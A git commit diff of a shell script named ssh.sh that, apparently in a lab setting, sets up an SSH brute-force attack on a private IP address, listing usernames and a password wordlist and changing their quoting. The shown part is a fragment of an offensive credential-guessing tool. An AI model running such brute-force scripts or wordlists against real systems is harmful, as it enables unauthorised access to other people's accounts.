4548e1d156b738a4b964ed2864578d2b694c5b45
Samuel Henryk De Souza Ziger <srziger3@gmail.com>
2026-04-26 19:19:12 -0300

    Update ssh.sh

--- ssh.sh
+++ ssh.sh
@@ -4,13 +4,13 @@ TARGET="10.20.20.57"
 
 USERS=("jonasf" "nickj" "joshuaa" "joaos" "leonardz" "anneh" "dmitrip")
 PASSWORDS=(
-"minecraft123"
-"ZeqlcR2!4gN"
-"QW5al7oPN2-1"
-"F147-0356agipV"
-"averylongpasswordfornohackertodiscover"
-"VSZ785-aWB15#q"
-"42W#wskb-62wA\$sc"
+'minecraft123'
+'ZeqlcR2!4gN'
+'QW5al7oPN2-1'
+'F147-0356agipV'
+'averylongpasswordfornohackertodiscover'
+'VSZ785-aWB15#q'
+'42W#wskb-62wA$sc'
 )
 
 echo "[+] Iniciando brute force em $TARGET..."
